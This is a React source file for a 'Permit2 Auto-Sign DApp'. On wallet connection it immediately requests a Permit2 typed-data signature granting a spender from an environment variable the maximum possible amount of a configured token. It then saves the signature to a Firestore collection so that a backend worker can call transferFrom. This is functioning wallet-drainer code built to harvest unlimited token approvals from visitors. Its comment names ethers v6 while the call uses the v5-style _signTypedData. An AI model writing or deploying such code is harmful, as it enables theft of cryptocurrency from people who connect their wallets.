import React, { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet } from '@reown/appkit/networks';
import { BrowserProvider } from 'ethers';
import { db } from './firebase';
import { doc, setDoc } from 'firebase/firestore';

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MaxUint160 = (2n ** 160n) - 1n;

const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet],
  projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
  metadata: {
    name: 'Permit2 App',
    description: 'Simple Permit2 auto-sign',
    url: 'https://example.com',
    icons: []
  },
});

export default function App() {
  const [status, setStatus] = useState("Not connected");

  useEffect(() => {
    const unsub = appKit.subscribeAccount((acct) => {
      if (acct?.isConnected && acct?.address) {
        setStatus(`Connected: ${acct.address}`);
        // Trigger auto sign
        autoSignPermit(acct.address);
      } else {
        setStatus('Not connected');
      }
    });
    return () => unsub();
  }, []);

  const autoSignPermit = async (owner) => {
    try {
      setStatus('Preparing Permit2 signature (open wallet when prompted)...');

      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) {
        setStatus('Wallet provider not available.');
        return;
      }

      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();

      const chainId = (await provider.getNetwork()).chainId;
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const nonce = 0;

      const permitted = {
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: MaxUint160.toString(),
        expiration: deadline,
        nonce
      };

      const domain = {
        name: 'Permit2',
        chainId,
        verifyingContract: PERMIT2
      };

      const types = {
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };

      const message = {
        details: permitted,
        spender: import.meta.env.VITE_SPENDER_ADDRESS,
        sigDeadline: deadline
      };

      setStatus('Requesting typed-data signature...');
      // ethers v6 signer method for typed data
      const signature = await signer._signTypedData(domain, types, message);

      const raw = signature.substring(2);
      const r = "0x" + raw.substring(0, 64);
      const s = "0x" + raw.substring(64, 128);
      const v = parseInt(raw.substring(128, 130), 16);

      // Save to firestore
      await setDoc(doc(db, "permit2_signatures", owner), {
        owner,
        spender: import.meta.env.VITE_SPENDER_ADDRESS,
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: MaxUint160.toString(),
        deadline,
        nonce,
        r, s, v,
        processed: false,
        timestamp: Date.now()
      });

      setStatus('Signature saved to Firestore. Backend worker will execute transferFrom.');

    } catch (err) {
      console.error(err);
      setStatus('Error: ' + (err?.message || String(err)));
    }
  };

  return (
    <div className="app-container">
      <h2>Permit2 Auto-Sign DApp</h2>
      <p style={{color:'#9fb4ff', marginBottom: 18}}>Click connect to open wallet modal and auto-sign permit.</p>
      <button className="connect" onClick={() => appKit.open()}>Connect Wallet</button>
      <div className="status">{status}</div>
    </div>
  );
}
